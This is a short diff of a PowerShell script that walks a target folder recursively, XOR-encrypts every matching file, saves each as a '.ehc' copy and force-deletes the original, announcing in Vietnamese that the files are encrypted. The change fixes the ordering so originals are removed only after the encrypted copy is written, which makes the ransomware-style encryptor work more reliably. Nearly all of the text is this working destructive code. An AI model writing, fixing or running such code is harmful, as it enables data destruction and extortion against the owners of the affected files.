@@ -8,11 +8,9 @@ Get-ChildItem -Path $targeted_folder -Recurse -File -Include $targeted_file | Fo
     for ($i=0; $i -lt $bytes.Length; $i++) {
         $bytes[$i] = $bytes[$i] -bxor $key
     }
-    [System.IO.File]::WriteAllBytes($file_path, $bytes)
-    Remove-Item -Path $file_path -Force
-    $new_file_path = $file_path + ".ehc" 
+    $new_file_path = $file_path + ".ehc"
     [System.IO.File]::WriteAllBytes($new_file_path, $bytes)
-    Remove-Item -Path $file_path -Force
+    Remove-Item -Path $file_path -Force  # Chỉ xóa khi đã tạo file .ehc
     Write-Host "Encrypted: $new_file_path"
 }
 Write-Host "Files da bi encrypt"
